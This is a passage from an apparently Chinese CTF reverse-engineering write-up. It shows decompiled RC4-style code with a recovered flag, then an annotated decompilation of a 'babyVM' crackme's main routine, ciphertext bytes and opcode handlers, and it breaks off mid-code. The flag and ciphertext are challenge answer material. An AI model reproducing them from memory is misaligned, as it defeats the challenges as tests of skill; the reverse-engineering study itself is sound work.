class="number">6U</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				T1 t3;</span><br><span class="line">				t3++;</span><br><span class="line">				num = (num2 * <span class="number">1047750269U</span>) ^ <span class="number">2517980139U</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">7U</span>:</span><br><span class="line">				array2 = <span class="keyword">new</span> T0[gparam_1.Length];</span><br><span class="line">				num = (num2 * <span class="number">835581391U</span>) ^ <span class="number">1087374551U</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">8U</span>:</span><br><span class="line">				<span class="keyword">goto</span> IL_0132;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">9U</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				t = (t + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">				t2 = (array[t] + t2) % <span class="number">256</span>;</span><br><span class="line">				T0 t4 = array[t];</span><br><span class="line">				array[t] = array[t2];</span><br><span class="line">				num = <span class="number">593623138U</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> array2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> array2;</span><br></pre></td></tr></table></figure>
<p>发现了很明显的RC4特征，推测是多异或了一个100（十进制）的RC4，在cyberchef解密，得到flag：<font color=deepskyblue><strong>flag{y0u_r34lly_kn0w_m@ny_pr0gr@mm1ng_l@ngu@g3$}</strong></font>.</p>
<h2 id="babyVM："><a href="#babyVM：" class="headerlink" title="babyVM："></a>babyVM：</h2><p>查看main：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int128 vars0[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> vars20; <span class="comment">// [rsp+20h] [rbp+20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 vars28; <span class="comment">// [rsp+28h] [rbp+28h]</span></span><br><span class="line"></span><br><span class="line">  vars28 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Inkey built a magic VM, can you solve it ? \nPlease input your flag &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(vars0, <span class="number">0</span>, <span class="keyword">sizeof</span>(vars0));</span><br><span class="line">  vars20 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%32s&quot;</span>, vars0);</span><br><span class="line">  VM((<span class="type">char</span> *)vars0);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(vars0, &amp;cipher, <span class="number">0x20u</span>LL) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Right! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong! &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现程序主逻辑很简洁，就是单纯的输入32字节的flag然后用VM加密并和密文比较，提取密文：<font color=lime><strong>[0xE5, 0xDF, 0xF0, 0xA1, 0xF4, 0xBD, 0x6A, 0xDB, 0x1B, 0xE9, 0xDD, 0x20, 0x0D, 0x9D, 0x21, 0x59, 0xD0, 0xB3, 0x59, 0x29, 0xB9, 0xEC, 0x2F, 0xC0, 0x22, 0x7E, 0xAD, 0xE1, 0xB0, 0x15, 0xB6, 0x29]</strong></font>，接下来查看VM的逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">VM</span><span class="params">(<span class="type">char</span> *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  dword_59D8 = <span class="number">0</span>;</span><br><span class="line">  qword_59D0 = <span class="number">0x1000001BF52L</span>L;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;unk_4BC0, dest, v1); <span class="comment">//传入的字符串</span></span><br><span class="line">  v2 = (<span class="type">char</span> *)<span class="built_in">stack</span>;</span><br><span class="line">  LODWORD(v3) = <span class="number">0</span>;</span><br><span class="line">  v4 = opcode[<span class="number">0</span>]; <span class="comment">//开始读取字节码</span></span><br><span class="line">  si128 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_2110);</span><br><span class="line">  v6 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_2100);</span><br><span class="line">  v7 = (<span class="type">char</span> *)&amp;unk_4BC0 - <span class="number">512</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v4 ) <span class="comment">//根据不同字节码选择不同逻辑</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">//push指令 </span></span><br><span class="line">        v26 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)]; <span class="comment">//第一个参数，用于判断来源</span></span><br><span class="line">        LODWORD(v27) = HIDWORD(qword_59D0) - <span class="number">4</span>;</span><br><span class="line">        HIDWORD(qword_59D0) -= <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v26 ) <span class="comment">//如果第一个参数不为0</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v26 != <span class="number">1</span> ) <span class="comment">//如果第一个参数也不为1就放弃执行字节码</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          v27 = (<span class="type">unsigned</span> <span class="type">int</span>)v27;</span><br><span class="line">          v28 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]; <span class="comment">//如果第一个参数为1则v28为第二个参数的值(push stack[v27], arg2)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//如果第一个参数为0则v28为寄存器中索引为第二个参数的对应的值</span></span><br><span class="line">        &#123;</span><br><span class="line">          v27 = (<span class="type">unsigned</span> <span class="type">int</span>)v27;</span><br><span class="line">          v28 = regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]]; <span class="comment">//push stack[v27], reg[arg2]</span></span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)&amp;v2[v27] = v28; <span class="comment">//将 v28 写入内存地址 v2 + v27</span></span><br><span class="line">        dword_59D8 += <span class="number">3</span>; <span class="comment">//后移3个字节</span></span><br><span class="line">        LODWORD(v3) = dword_59D8;</span><br><span class="line">        v4 = opcode[dword_59D8]; <span class="comment">//转到下一个字节码</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//结束VM，将加密结果复制回传入的字符串</span></span><br><span class="line">        v24 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;unk_4BC0, v24);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//mov指令</span></span><br><span class="line">        <span class="keyword">switch</span> ( opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)] ) <span class="comment">//用第一个参数来分类</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">//mov memory[reg[arg2]+arg3], reg[arg4]</span></span><br><span class="line">            v40 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]; <span class="comment">//第三个参数：偏移量</span></span><br><span class="line">            v41 = regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]]; <span class="comment">//第四个参数：寄存器索引对应的值</span></span><br><span class="line">            v42 = &amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]]]; <span class="comment">//第二个参数：寄存器索引对应v7的偏移地址</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_76;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//mov reg[arg2], reg[arg3]</span></span><br><span class="line">            regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] = regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//mov memory[reg[arg2]+arg3], arg4</span></span><br><span class="line">            v37 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">            v38 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)];</span><br><span class="line">            v39 = &amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]]];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">//mov reg[arg2], memory[reg[arg3] + arg4]</span></span><br><span class="line">            regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] = *(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">//mov reg[arg2], arg3</span></span><br><span class="line">            regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">5</span>: <span class="comment">//mov (LOBYTE)memory[reg[arg2] + arg3], reg[arg4] &amp; 0xFF</span></span><br><span class="line">            v37 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">            LOBYTE(v38) = regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">            v39 = &amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]]];</span><br><span class="line">LABEL_70:</span><br><span class="line">            v39[v37] = v38;</span><br><span class="line">            dword_59D8 = v3 + <span class="number">5</span>; <span class="comment">//前进5个字节</span></span><br><span class="line">            v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>);</span><br><span class="line">            v4 = opcode[v3];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">6</span>: <span class="comment">//mov (LOBYTE)reg[arg2], memory[(reg[arg3] + arg4)] &amp; 0xFF</span></span><br><span class="line">            LOBYTE(regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]]) = v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">7</span>: <span class="comment">//mov memory[reg[arg2] + arg3], arg4</span></span><br><span class="line">            v40 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">            v41 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)];</span><br><span class="line">            v42 = &amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]]];</span><br><span class="line">LABEL_76:</span><br><span class="line">            *(_DWORD *)&amp;v42[v40] = v41; <span class="comment">//将第四个参数的值写入v7的偏移地址加上第三个参数的偏移量</span></span><br><span class="line">            dword_59D8 = v3 + <span class="number">5</span>;</span><br><span class="line">            v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>);</span><br><span class="line">            v4 = opcode[v3];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">8</span>: <span class="comment">//mov reg[arg2], memory[reg[arg3] + reg[arg4]]</span></span><br><span class="line">            regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] = *(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]]];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">9</span>: <span class="comment">//mov reg[arg2], memory[reg[arg3] + reg[arg4] * arg5]</span></span><br><span class="line">regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] = *(_DWORD *)&amp;v7[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>)] * regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]] + regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]]];</span><br><span class="line">            dword_59D8 += <span class="number">6</span>;</span><br><span class="line">            LODWORD(v3) = dword_59D8;</span><br><span class="line">            v4 = opcode[dword_59D8];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">10</span>: <span class="comment">//mov reg[arg2], memory[reg[arg3] + reg[arg4] * arg5 + arg6]</span></span><br><span class="line">regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] = *(_DWORD *)&amp;v7[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>)] * regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]] + regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">6</span>)]];</span><br><span class="line">            dword_59D8 += <span class="number">7</span>;</span><br><span class="line">            LODWORD(v3) = dword_59D8;</span><br><span class="line">            v4 = opcode[dword_59D8];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">11</span>: <span class="comment">//mov memory[reg[arg2] + reg[arg3] * arg4], reg[arg5]</span></span><br><span class="line">*(_DWORD *)&amp;v7[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)] * regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]]] = regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>)]];</span><br><span class="line">            dword_59D8 = v3 + <span class="number">6</span>;</span><br><span class="line">            v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">6</span>);</span><br><span class="line">            v4 = opcode[v3];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">12</span>: <span class="comment">//mov memory[reg[arg2] + reg[arg3] * arg4 + arg5], reg[arg6]</span></span><br><span class="line">*(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>)] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)] * regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]]] = regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">6</span>)]];</span><br><span class="line">            dword_59D8 = v3 + <span class="number">7</span>;</span><br><span class="line">            v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">7</span>);</span><br><span class="line">            v4 = opcode[v3];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">//sub指令</span></span><br><span class="line">        v22 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)]; <span class="comment">//根据第一个参数选择</span></span><br><span class="line">        <span class="keyword">if</span> ( v22 == <span class="number">3</span> ) <span class="comment">//为3：sub reg[arg2], memory[reg[arg3] + arg4]</span></span><br><span class="line">        &#123;</span><br><span class="line">          v33 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">          regs[v33] -= *(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v22 != <span class="number">4</span> ) <span class="comment">//为4：sub reg[arg2], arg3</span></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        v23 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">        regs[v23] -= opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">//add指令</span></span><br><span class="line">        v20 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">switch</span> ( v20 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">//add reg[arg2], memory[reg[arg3] + arg4]</span></span><br><span class="line">            v35 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">            regs[v35] += *(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">//add reg[arg2], arg3</span></span><br><span class="line">            v34 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">            regs[v34] += opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//add memory[reg[arg2] + arg3], arg4</span></span><br><span class="line">            v21 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)] + (<span class="type">unsigned</span> __int64)regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]];</span><br><span class="line">            *(_DWORD *)&amp;v7[v21] += opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)];</span><br><span class="line">            dword_59D8 = v3 + <span class="number">5</span>;</span><br><span class="line">            v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>);</span><br><span class="line">            v4 = opcode[v3];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>: <span class="comment">//xor指令</span></span><br><span class="line">        v18 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">if</span> ( v18 == <span class="number">3</span> ) <span class="comment">//xor arg2, memory[reg[arg3] + arg4]</span></span><br><span class="line">        &#123;</span><br><span class="line">          opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)] ^= *(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">          dword_59D8 = v3 + <span class="number">5</span>;</span><br><span class="line">          v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>);</span><br><span class="line">          v4 = opcode[v3];</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v18 &gt; <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v18 != <span class="number">4</span> ) <span class="comment">//xor reg[arg2], arg3</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          v29 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">          regs[v29] ^= opcode[(<span class="type">unsigned</span> <span 